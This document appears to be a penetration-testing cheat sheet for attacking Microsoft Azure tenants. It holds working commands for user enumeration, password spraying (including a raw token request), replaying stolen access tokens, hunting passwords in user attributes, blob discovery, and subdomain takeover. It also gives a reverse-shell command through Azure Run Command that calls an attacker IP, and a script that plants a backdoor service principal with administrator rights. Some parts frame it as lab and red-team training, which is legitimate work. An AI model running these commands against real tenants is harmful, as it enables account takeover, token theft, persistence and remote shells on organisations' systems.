# Azure
# Azure Tenant Attacks - Detailed Guide

## Introduction
An **Azure Tenant** represents an organization within **Microsoft Azure Active Directory (Azure AD)**. Identifying an organization's Azure Tenant ID or domain can open up multiple attack vectors that penetration testers or malicious actors might exploit.

This guide explains various attack scenarios related to Azure Tenant enumeration, misconfiguration exploitation, and advanced attack techniques.

---

## 1. Enumerating Users
### **Overview**
User enumeration helps identify valid accounts within an Azure AD Tenant, which can later be exploited for further attacks.

### **How It Works**
- Use Microsoft login portals (`https://login.microsoftonline.com`) to check if an email exists.
- Use **Microsoft Graph API** to query users.
- Attempt **Brute Force or Password Spraying** with common credentials.

### **Tools**
- `curl` requests to Microsoft login portals.
- PowerShell scripts for Graph API enumeration.

### **Exploitation**
- Identify active accounts for phishing attacks.
- Conduct password-spraying attacks to gain access.

---

## 2. Password Spraying & Brute-Forcing
### **Overview**
Azure AD authentication can be brute-forced using password spraying techniques.

### **How It Works**
- Attackers try common passwords like `Winter2024!`, `Company123!`, or `Password123!`.
- Azure AD may not lock accounts after multiple failed attempts.

### **Tools**
- [Azzure](https://github.com/Hackndo/Azzure)
- [MSOLSpray](https://github.com/dafthack/MSOLSpray)

### **Exploitation**
- Gain unauthorized access to user accounts.
- Escalate privileges if MFA is not enforced.

---

## 3. Phishing & OAuth Token Hijacking
### **Overview**
OAuth token theft can be used to bypass password-based authentication.

### **How It Works**
- Attackers create phishing pages that mimic Azure login portals.
- Users unknowingly authenticate, granting token access to attackers.

### **Tools**
- [EvilGinx](https://github.com/kgretzky/evilginx2) for MITM OAuth phishing.

### **Exploitation**
- Access cloud services without needing passwords.
- Move laterally within an organization’s Azure infrastructure.

---

## 4. Checking for Misconfigurations
### **Overview**
Some Azure AD tenants have weak configurations that expose sensitive data.

### **How It Works**
- Check if **guest access** is enabled in Microsoft Teams or SharePoint.
- Identify public files on **OneDrive or SharePoint**.
- Look for misconfigured **OAuth apps**.

### **Tools**
- PowerShell commands for Azure AD configuration checks.
- Manual enumeration of OneDrive and SharePoint.

### **Exploitation**
- Gain unauthorized access to sensitive documents.
- Use internal documents for social engineering.

---

## 5. Exploiting SaaS Applications Linked to Azure AD
### **Overview**
Many organizations integrate third-party SaaS apps with Azure AD, leading to potential vulnerabilities.

### **How It Works**
- Enumerate OAuth applications linked to an organization’s Azure AD.
- Exploit weak OAuth permissions to hijack user sessions.

### **Tools**
- `jwt_tool` for testing OAuth tokens.

### **Exploitation**
- Gain access to enterprise applications.
- Exploit OAuth misconfigurations to escalate privileges.

---

## 6. Exploiting Hybrid Environments (Azure AD Connect)
### **Overview**
Some organizations connect Azure AD with traditional on-premise **Active Directory**, introducing new attack vectors.

### **How It Works**
- Identify **Azure AD Connect** installations.
- Use **Kerberoasting** or **NTLM Relaying** to steal credentials.

### **Tools**
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) for Active Directory recon.
- [Impacket](https://github.com/SecureAuthCorp/impacket) for NTLM relay attacks.

### **Exploitation**
- Escalate privileges within an organization’s internal network.
- Move laterally across hybrid environments.

---

## Conclusion
Identifying an organization's **Azure Tenant** provides attackers with multiple opportunities for reconnaissance and exploitation. Organizations should:
- Enforce **MFA** to mitigate password attacks.
- Restrict **guest access** to minimize exposure.
- Monitor **OAuth applications** to prevent token hijacking.

By understanding these attack vectors, penetration testers and security teams can better defend their Azure environments.

---

## References
- [Microsoft Azure AD Documentation](https://docs.microsoft.com/en-us/azure/active-directory/)
- [Azzure - Azure AD Enumeration Tool](https://github.com/Hackndo/Azzure)
- [EvilGinx2 - Advanced Phishing](https://github.com/kgretzky/evilginx2)



### Basic Info
```
**Tools** 
https://github.com/dirkjanm/ROADtools
https://github.com/dafthack/PowerMeta
https://github.com/NetSPI/MicroBurst
https://github.com/nccgroup/ScoutSuite
https://github.com/hausec/PowerZure
https://github.com/fox-it/adconnectdump
https://github.com/FSecureLABS/Azurite
https://github.com/mburrough/pentestingazureapps
https://github.com/Azure/Stormspotter
https://github.com/nccgroup/azucar
https://github.com/dafthack/MSOLSpray
https://github.com/BloodHoundAD/BloodHound
https://github.com/nccgroup/Carnivore
https://github.com/CrowdStrike/CRT
https://github.com/Kyuu-Ji/Awesome-Azure-Pentest
https://github.com/cyberark/blobhunter
https://github.com/Gerenios/AADInternals
https://github.com/prowler-cloud/prowler

- Check if company is using Azure AD:
https://login.microsoftonline.com/getuserrealm.srf?login=username@COMPANY.onmicrosoft.com&xml=1
- If NameSpaceType is "Managed", the company uses Azure AD
- Enumerate Azure AD emails
https://github.com/LMGsec/o365creeper

Auth methods:
• Password Hash Synchronization
   ◇ Azure AD Connect
   ◇ On-prem service synchronizes hashed user credentials to Azure
   ◇ User can authenticate directly to Azure services like O365 with their internal domain credential
• Pass Through Authentication
   ◇  Credentials stored only on-prem
   ◇ On-prem agent validates authentication requests to Azure AD
   ◇ Allows SSO to other Azure apps without creds stored in cloud
• Active Directory Federation Services (ADFS)
   ◇ Credentials stored only on-prem
   ◇ Federated trust is setup between Azure and on-prem AD to validate auth requests to the cloud
   ◇ For password attacks you would have to auth to the on-prem ADFS portal instead of Azure endpoints
• Certificate-based auth
   ◇ Client certs for authentication to API
   ◇ Certificate management in legacy Azure Service Management (ASM) makes it impossible to know who created a cert (persistence potential)
   ◇ Service Principals can be setup with certs to auth
• Conditional access policies
• Long-term access tokens
   ◇ Authentication to Azure with oAuth tokens
   ◇ Desktop CLI tools that can be used to auth store access tokens on disk
   ◇ These tokens can be reused on other MS endpoints
   ◇ We have a lab on this later!
• Legacy authentication portals

Recon:
• O365 Usage
   ◇ https://login.microsoftonline.com/getuserrealm.srf?login=username@acmecomputercompany.com&xml=1
   ◇ https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/test@targetdomain.com?Protocol=Autodiscoverv1
• User enumeration on Azure can be performed at
    https://login.Microsoft.com/common/oauth2/token
      ▪ This endpoint tells you if a user exists or not
   ◇ Detect invalid users while password spraying with:
      ▪ https://github.com/dafthack/MSOLSpray
   ◇ For on-prem OWA/EWS you can enumerate users with timing attacks (MailSniper)
• Auth 365 Recon:
(https://github.com/nyxgeek/o365recon

Microsoft Azure Storage:
• Microsoft Azure Storage is like Amazon S3
• Blob storage is for unstructured data
• Containers and blobs can be publicly accessible via access policies
• Predictable URL’s at core.windows.net
   ◇ storage-account-name.blob.core.windows.net
   ◇ storage-account-name.file.core.windows.net
   ◇ storage-account-name.table.core.windows.net
   ◇ storage-account-name.queue.core.windows.net
• The “Blob” access policy means anyone can anonymously read blobs, but can’t list the blobs in the container
• The “Container” access policy allows for listing containers and blobs
• Microburst https://github.com/NetSPI/MicroBurst
   ◇ Invoke-EnumerateAzureBlobs
   ◇ Brute forces storage account names, containers, and files
   ◇ Uses permutations to discover storage accounts
        PS > Invoke-EnumerateAzureBlobs –Base 

Password Attacks
• Password Spraying Microsoft Online (Azure/O365)
• Can spray https://login.microsoftonline.com
--
POST /common/oauth2/token HTTP/1.1
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Host: login.microsoftonline.com
Content-Length: 195
Expect: 100-continue
Connection: close

resource=https%3A%2F%2Fgraph.windows.net&client_id=1b730954-1685-4b74-9bfd-
dac224a7b894&client_info=1&grant_type=password&username=user%40targetdomain.com&passwor
d=Winter2020&scope=openid
--
• MSOLSpray https://github.com/dafthack/MSOLSpray
   ◇ The script logs:
      ▪ If a user cred is valid
      ▪ If MFA is enabled on the account
      ▪ If a tenant doesn't exist
      ▪ If a user doesn't exist
      ▪ If the account is locked
      ▪ If the account is disabled
      ▪ If the password is expired
   ◇ https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes

Password protections & Smart Lockout
• Azure Password Protection – Prevents users from picking passwords with certain words like seasons, company name, etc.
• Azure Smart Lockout – Locks out auth attempts whenever brute force or spray attempts are detected.
   ◇ Can be bypassed with FireProx + MSOLSpray
   ◇ https://github.com/ustayready/fireprox

Phising session hijack
• Evilginx2 and Modlishka
   ◇ MitM frameworks for harvesting creds/sessions
   ◇ Can also evade 2FA by riding user sessions
• With a hijacked session we need to move fast
• Session timeouts can limit access
• Persistence is necessary

Steal Access Tokens
• Azure config files:
   web.config
   app.config
   .cspkg
   .publishsettings
• Azure Cloud Service Packages (.cspkg)
• Deployment files created by Visual Studio
• Possible other Azure service integration (SQL, Storage, etc.)
• Look through cspkg zip files for creds/certs
• Search Visual Studio Publish directory
    \bin\debug\publish
• Azure Publish Settings files (.publishsettings)
   ◇ Designed to make it easier for developers to push code to Azure
   ◇ Can contain a Base64 encoded Management Certificate
   ◇ Sometimes cleartext credentials
   ◇ Open publishsettings file in text editor
   ◇ Save “ManagementCertificate” section into a new .pfx file
   ◇ There is no password for the pfx
   ◇ Search the user’s Downloads directory and VS projects
• Check %USERPROFILE&\.azure\ for auth tokens
• During an authenticated session with the Az PowerShell module a TokenCache.dat file gets generated in the %USERPROFILE%\.azure\ folder.
• Also search disk for other saved context files (.json)
• Multiple tokens can exist in the same context file

Post-Compromise
• What can we learn with a basic user?
• Subscription Info
• User Info
• Resource Groups
• Scavenging Runbooks for Creds
• Standard users can access Azure domain information and isn’t usually locked down
• Authenticated users can go to portal.azure.com and click Azure Active Directory
• O365 Global Address List has this info as well
• Even if portal is locked down PowerShell cmdlets will still likely work
• There is a company-wide setting that locks down the entire org from viewing Azure info via cmd line: Set-MsolCompanySettings – UsersPermissionToReadOtherUsersEnabled $false

Azure: CLI Access
• Azure Service Management (ASM or Azure “Classic”)
   ◇ Legacy and recommended to not use
• Azure Resource Manager (ARM)
   ◇ Added service principals, resource groups, and more
   ◇ Management Certs not supported
• PowerShell Modules
   ◇ Az, AzureAD & MSOnline
• Azure Cross-platform CLI Tools
   ◇ Linux and Windows client

Azure: Subscriptions
• Organizations can have multiple subscriptions
• A good first step is to determine what subscription you are in
• The subscription name is usually informative
• It might have “Prod”, or “Dev” in the title
• Multiple subscriptions can be under the same Azure AD directory (tenant)
• Each subscription can have multiple resource groups

Azure User Information
• Built-In Azure Subscription Roles
   ◇ Owner (full control over resource)
   ◇ Contributor (All rights except the ability to change permissions)
   ◇ Reader (can only read attributes)
   ◇ User Access Administrator (manage user access to Azure resources)
• Get the current user’s role assignement
    PS> Get-AzRoleAssignment
• If the Azure portal is locked down it is still possible to access Azure AD user information via MSOnline cmdlets
• The below examples enumerate users and groups
    PS> Import-Module MSOnline
    PS> Connect-MsolService
Or
    PS> $credential = Get-Credential
    PS> Connect-MsolService -Credential $credential
    
    PS> Get-MSolUser -All
    PS> Get-MSolGroup –All
    PS> Get-MSolGroupMember –GroupObjectId 
    PS> Get-MSolCompanyInformation
• Pipe Get-MSolUser –All to format list to get all user attributes
    PS> Get-MSolUser –All | fl

Azure Resource Groups
• Resource Groups collect various services for easier management
• Recon can help identify the relationships between services such as WebApps and SQL
    PS> Get-AzResource
    PS> Get-AzResourceGroup
    PS> Get-AzStorageAccount
Azure: Runbooks
• Azure Runbooks automate various tasks in Azure
• Require an Automation Account and can contain sensitive information like passwords
    PS> Get-AzAutomationAccount
    PS> Get-AzAutomationRunbook -AutomationAccountName  -ResourceGroupName 
• Export a runbook with:
    PS> Export-AzAutomationRunbook -AutomationAccountName  -ResourceGroupName  -Name  -OutputFolder .\Desktop\

Azure VMs:
   PS> Get-AzVM
   PS> $vm = Get-AzVM -Name "VM Name"
   PS> $vm.OSProfile
   PS> Invoke-AzVMRunCommand -ResourceGroupName $ResourceGroupName -VMName $VMName -CommandId RunPowerShellScript -ScriptPath ./powershell-script.ps1

Azure Virtual Networks:
   PS> Get-AzVirtualNetwork
   PS> Get-AzPublicIpAddress
   PS> Get-AzExpressRouteCircuit
   PS> Get-AzVpnConnection

# Quick 1-liner to search all Azure AD user attributes for passwords after auth'ing with Connect-MsolService:  
$x=Get-MsolUser;foreach($u in $x){$p = @();$u|gm|%{$p+=$_.Name};ForEach($s in $p){if($u.$s -like "*password*"){Write("[*]"+$u.UserPrincipalName+"["+$s+"]"+" : "+$u.$s)}}}

# https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html

# Removing Azure services
- Under Azure Portal -> Resource Groups

# Interesting metadata instance urls:
http://169.254.169.254/metadata/v1/maintenance
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

### Traditional AD - Azure AD comparision
![AzureADvsAD 1](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/5873b8b1-32b7-4cdc-a00d-43a628e421f7)

### Basic Azure AD concepts and tips
```
- Source of authentication for Office 365, Azure Resource Manager, and anything else you integrate with it.

- Powershell interaction:
• MSOnline PowerShell module
    • Focusses on Office 365
    • Some Office 365 specific features
• AzureAD PowerShell module
    • General Azure AD
    • Different feature set
• Azure CLI / Az powershell module
    • More focus on Azure Resource Manager
    
- Azure AD principals
• Users
• Devices
• Applications

- Azure AD roles
• RBAC Roles are only used for Azure Resource Manager
• Office 365 uses administrator roles exclusively

- Azure AD admin roles
• Global/Company administrator can do anything
• Limited administrator accounts
    • Application Administrator
    • Authentication Administrator
    • Exchange Administrator
    • Etc
• Roles are fixed

- Azure AD applications
• Documentation unclear
• Terminology different between documentation, APIs and Azure portal
• Complex permission system
• Most confusing part
• Examples:
    • Microsoft Graph
    • Azure Multi-Factor Auth Client
    • Azure Portal
    • Office 365 portal
    • Azure ATP
• A default Office 365 Azure AD has about 200 service principals
    (read: applications)
- App permissions
• Two types of privileges:
    • Delegated permissions
    • Require signed-in user present to utilize
• Application permissions
    • Are assigned to the application, which can use them at any time
• These privileges are assigned to the service principal
• Every application defines permissions
• Can be granted to Service Principals
• Commonly used:
    • Microsoft Graph permissions
    • Azure AD Graph permissions
    
- Azure AD Sync Account
• Dump all on-premise password hashes (if PHS is enabled)
• Log in on the Azure portal (since it’s a user)
• Bypass conditional access policies for admin accounts
• Add credentials to service principals
• Modify service principals properties

If password hash sync is in use:
Compromised Azure AD connect Sync account = Compromised AD

• Encryption key is encrypted with DPAPI
• Decrypted version contains some blob with AES keys
• Uses AES-256 in CBC mode

Anyone with control over Service Principals can assign credentials to them and potentially escalate privileges.

Anyone who can edit properties* of the AZUREADSSOACC$ account, can impersonate any user in Azure AD using Kerberos (if no MFA)
```

### Azure enum
* [AAD Internals](https://aadinternals.com/aadinternals/#get-aadinttenantdomains)

```
# Must install
# https://github.com/Gerenios/AADInternals 
# https://github.com/NetSPI/MicroBurst

# Get Tenant Name
https://login.microsoftonline.com/getuserrealm.srf?login=admin@COMPANY.onmicrosoft.com&xml=1

# Get Tenant ID with AADInternals
Get-AADIntTenantID -Domain COMPANY.onmicrosoft.com
# Get Tenant ID manually
https://login.microsoftonline.com/COMPANY.onmicrosoft.com/.well-known/openid-configuration

# Get Tenant Domains
Get-AADIntTenantDomains -Domain COMPANY.com

# Get valid email addresses
# https://github.com/Raikia/UhOh365

# Azure Services (MicroBurst)
Invoke-EnumerateAzureSubDomains -Base COMPANY -Verbose

# Azure Blobs (MicroBurst)
Invoke-EnumerateAzureBlobs -Base COMPANY

# Azure Users on Tenant (Az Module)
Get-AzureADUser -All $true

# Azure Groups on Tenant (Az Module)
Get-AzureADGroup -All $true

# Get user's read permissions on Azure Resources (Az Module)
Get-AzResource

# List Dynamic Groups (Az Module)
Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}

# List Membership group rules (Az Module)
Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'} | select MembershipRule
```

### Azure attacks examples
```
# Password spraying
https://github.com/dafthack/MSOLSpray/MSOLSpray.ps1
Create a text file with ten (10) fake users we will spray along with your own user account (YourAzureADUser@youraccount.onmicrosoft.com ). (Do not spray accounts you do not own. You may use my domain “glitchcloud.com” for generating fake target users) and save as userlist.txt

Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\userlist.txt -Password [the password you set for your test account]

# Access Token

PS> Import-Module Az
PS> Connect-AzAccount
or
PS> $credential = Get-Credential
PS>Connect-AzAccount -Credential $credential

PS> mkdir C:\Temp
PS> Save-AzContext -Path C:\Temp\AzureAccessToken.json
PS> mkdir “C:\Temp\Live Tokens”

# Auth
Connect-AzAccount
## Or this way sometimes gets around MFA restrictions
$credential = Get-Credential
Connect-AzAccount -Credential $credential

Open Windows Explorer and type %USERPROFILE%\.Azure\ and hit enter
• Copy TokenCache.dat & AzureRmContext.json to C:\Temp\Live Tokens
• Now close your authenticated PowerShell window!

Delete everything in %USERPROFILE%\.azure\
• Start a brand new PowerShell window and run:
PS> Import-Module Az
PS> Get-AzContext -ListAvailable
• You shouldn’t see any available contexts currently

• In your PowerShell window let’s manipulate the stolen TokenCache.dat and AzureRmContext.json files so we can import it into our PowerShell session

PS> $bytes = Get-Content "C:\Temp\Live Tokens\TokenCache.dat" -Encoding byte
PS> $b64 = [Convert]::ToBase64String($bytes)
PS> Add-Content "C:\Temp\Live Tokens\b64-token.txt" $b64

• Now let’s add the b64-token.txt to the AzureRmContext.json file.
• Open the C:\Temp\Live Tokens folder.
• Open AzureRmContext.json file in a notepad and find the line near the end of the file title “CacheData”. It should be null.
• Delete the word “null” on this line
• Where “null” was add two quotation marks (“”) and then paste the contents of b64-token.txt in between them.
• Save this file as C:\Temp\Live Tokens\StolenToken.json
• Let’s import the new token

PS> Import-AzContext -Profile 'C:\Temp\Live Tokens\StolenToken.json’

• We are now operating in an authenticated session to Azure

PS> $context = Get-AzContext
PS> $context.Account

• You can import the previously exported context (AzureAccessToken.json) the same way

# Azure situational awareness
• GOAL: Use the MSOnline and Az PowerShell modules to do basic enumeration of an Azure account post-compromise.
• In this lab you will authenticate to Azure using your Azure AD account you setup. Then, you will import the MSOnline and Az PowerShell modules and try out some of the various modules that assist in enumerating Azure resource usage.

• Start a new PowerShell window and import both the MSOnline and Az modules
    PS> Import-Module MSOnline
    PS> Import-Module Az
• Authenticate to each service with your Azure AD account:
    PS> Connect-AzAccount
    PS> Connect-MsolService
• First get some basic Azure information 
    PS> Get-MSolCompanyInformation
• Some interesting items here are
   ◇ UsersPermissionToReadOtherUsersEnabled
   ◇ DirSyncServiceAccount
   ◇ PasswordSynchronizationEnabled
   ◇ Address/phone/emails
• Next, we will start looking at the subscriptions associated with the account as well as look at the current context we are operating in. Look at the “Name” of the subscription and context for possible indication as to what it is associated with.
    PS> Get-AzSubscription
    PS> $context = Get-AzContext
    PS> $context.Name
    PS> $context.Account
• Enumerating the roles assigned to your user will help identify what permissions you might have on the subscription as well as who to target for escalation.
    PS> Get-AzRoleAssignment
• List out the users on the subscription. This is the equivalent of “net users /domain” in on-prem AD
    PS> Get-MSolUser -All
    PS> Get-AzAdApplication
    PS> Get-AzWebApp
    PS> Get-AzSQLServer
    PS> Get-AzSqlDatabase -ServerName $ServerName -ResourceGroupName $ResourceGroupName
    PS> Get-AzSqlServerFirewallRule –ServerName $ServerName -ResourceGroupName $ResourceGroupName
    PS> Get-AzSqlServerActiveDirectoryAdminstrator -ServerName $ServerName -ResourceGroupName $ResourceGroupName
• The user you setup likely doesn’t have any resources currently associated with it, but these commands will help to understand the specific resources a user you gain access to has.
    PS> Get-AzResource
    PS> Get-AzResourceGroup
• Choose a subscription
    PS> Select-AzSubscription -SubscriptionID "SubscriptionID"
• There are many other functions.
• Use Get-Module to list out the other Az module groups
• To list out functions available within each module use the below command substituting the value of the “Name” parameter.
    PS> Get-Module -Name Az.Accounts | Select-Object -ExpandProperty ExportedCommands
    PS> Get-Module -Name MSOnline | Select-Object -ExpandProperty ExportedCommands
```

### Azure Block Blobs (S3 equivalent) attacks
```
# Discovering with Google Dorks
site:*.blob.core.windows.net
site:*.blob.core.windows.net ext:xlsx | ext:csv "password"
# Discovering with Dns enumeration
python dnscan.py -d blob.core.windows.net -w subdomains-100.txt

# When you found one try with curl, an empty container respond with 400

# List containers
az storage container list --connection-string '<connection string>'
# List blobs in containers
az storage blob list --container-name <container name> --connection-string '<connection string>'
# Download blob from container
az storage blob download --container-name <container name> --name <file> --file /tmp/<file> --connection-string '<connection string>'
```

### Azure subdomain takeovers
```
# Azure CloudApp: cloudapp.net
    1 Check CNAME with dig pointing to cloudapp.net
    2 Go to https://portal.azure.com/?quickstart=True#create/Microsoft.CloudService
    3 Register unclaimed domain which CNAME is pointing


# Azure Websites: azurewebsites.net
    1 Check CNAME with dig pointing to azurewebsites.net
    2 Go to https://portal.azure.com/#create/Microsoft.WebSite
    3 Register unclaimed domain which CNAME is pointing
    4 Register domain on the Custom domains section of the dashboard

# Azure VM: cloudapp.azure.com
    1 Check CNAME with dig pointing to *.region.cloudapp.azure.com
    2 Registering a new VM in the same region with size Standard_B1ls (cheapest) with 80 and 443 open
    3 Go to Configuration and set the domain name which CNAME is pointing    
```


### Other Azure Services
```
# Azure App Services Subdomain Takeover
- For target example.com you found users.example.com
- Go https://users.galaxybutter.com and got an error
- dig CNAME users.galaxybutter.com and get an Azure App Services probably deprecated or removed
- Creat an App Service and point it to the missing CNAME
- Add a custom domain to the App Service
- Show custom content

# Azure Run Command
# Feature that allows you to execute commands without requiring SSH or SMB/RDP access to a machine. This is very similar to AWS SSM.
az login
az login --use-device-code #Login
az group list #List groups
az vm list -g GROUP-NAME #List VMs inside group
#Linux VM
az vm run-command invoke -g GROUP-NAME -n VM-NAME --command-id RunShellScript --scripts "id"
#Windos VM
az vm run-command invoke -g GROUP-NAME -n VM-NAME --command-id RunPowerShellScript --scripts "whoami"
# Linux Reverse Shell Azure Command
az vm run-command invoke -g GROUP-NAME -n VM-NAME --command-id RunShellScript --scripts "bash -c \"bash -i >& /dev/tcp/ATTACKER-EXTERNAL-IP/9090 0>&1\""

# Azure SQL Databases
- MSSQL syntaxis
- Dorks: "database.windows.net" site:pastebin.com

# Azure AD commands
az ad sp list --all
az ad app list --all

# Azure metadata service
http://169.254.169.254/metadata/instance
https://github.com/microsoft/azureimds
```


### Create Azure service principal as backdoor
```
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$spn
$BSTR = ::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = ::PtrToStringAuto($BSTR)
$UnsecureSecret
$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
$role = Get-MsolRole -RoleName "Company Administrator"
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -
RoleMemberObjectId $sp.ObjectId
#Enter the AppID as username and what was returned for $UnsecureSecret as the password
in the Get-Credential prompt
$cred = Get-Credential
Connect-AzAccount -Credential $cred -Tenant “tenant ID" -ServicePrincipal
```

### Azure password reset
![image (2)](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/893b0879-6427-43b5-8ec8-491e41145698)

![image (3)](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/9415a97b-49b0-41e0-83ca-46c01a967418)
